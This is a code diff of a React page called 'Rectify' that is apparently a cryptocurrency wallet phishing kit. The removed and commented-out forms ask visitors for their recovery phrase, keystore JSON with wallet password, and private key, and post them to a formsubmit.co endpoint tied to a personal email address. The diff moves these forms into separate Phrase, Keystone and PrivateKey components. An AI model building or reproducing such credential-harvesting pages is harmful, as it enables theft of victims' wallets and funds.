@@ -5,14 +5,17 @@ import { Tab, Tabs, TabList, TabPanel } from "react-tabs";
 import "react-tabs/style/react-tabs.css";
 import Marquee from "../components/Marquee";
 import Footer from "../components/Footer";
+import Phrase from "../components/Forms/Phrase";
+import Keystone from "../components/Forms/Keystone";
+import PrivateKey from "../components/Forms/PrivateKey";
 
 function Rectify() {
- // FORM MODAL
+  // FORM MODAL
   const [open, setOpen] = useState(false);
 
   const onCloseModal = () => setOpen(false);
 
-//  INITIALIZING MODAL
+  //  INITIALIZING MODAL
   const [openInit, setOpenInit] = useState(false);
 
   const onCloseInitModal = () => setOpenInit(false);
@@ -41,7 +44,7 @@ function Rectify() {
       </div>
 
       <div>
-       {/* INITIALIZING MODAL */}
+        {/* INITIALIZING MODAL */}
         <Modal
           open={openInit}
           onClose={onCloseInitModal}
@@ -97,82 +100,13 @@ function Rectify() {
                 </TabList>
 
                 <TabPanel>
-                  <form
-                    className="fmt_panel"
-                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
-                    method="POST"
-                  >
-                    <textarea
-                      required
-                      rows={4}
-                      placeholder="Enter your recovery phrase"
-                      type="text"
-                      name="recovery phrase"
-                    />
-                    <p>
-                      Typically 12 (sometimes 24) words separated by single
-                      spaces
-                    </p>
-                    <button type="submit">
-                      IMPORT
-                      <span>
-                        <svg
-                          fill="none"
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth="2"
-                          viewBox="0 0 24 24"
-                          stroke="currentColor"
-                        >
-                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                        </svg>
-                      </span>
-                    </button>
-                  </form>
+                  <Phrase/>
                 </TabPanel>
                 <TabPanel>
-                  <form
-                    className="fmt_panel"
-                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
-                    method="POST"
-                  >
-                    <textarea
-                      required
-                      rows={4}
-                      placeholder="Enter your Keystore JSON"
-                      style={{ marginBottom: "1.5rem" }}
-                      type="text"
-                      name="keystore jSON"
-                    />
-                    <input
-                      required
-                      placeholder="Wallet password"
-                      type="text"
-                      name="wallet password"
-                    />
-                    <p>
-                      Several lines of text beginning with "{`{`}...{`}`}" plus
-                      the password you used to encrypt it.
-                    </p>
-                    <button type="submit">
-                      IMPORT
-                      <span>
-                        <svg
-                          fill="none"
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth="2"
-                          viewBox="0 0 24 24"
-                          stroke="currentColor"
-                        >
-                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                        </svg>
-                      </span>
-                    </button>
-                  </form>
+                  <Keystone/>
                 </TabPanel>
                 <TabPanel>
-                  <form
+                  {/* <form
                     className="fmt_panel"
                     action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
                     method="POST"
@@ -202,7 +136,8 @@ function Rectify() {
                         </svg>
                       </span>
                     </button>
-                  </form>
+                  </form> */}
+                  <PrivateKey/>
                 </TabPanel>
               </Tabs>
             </div>
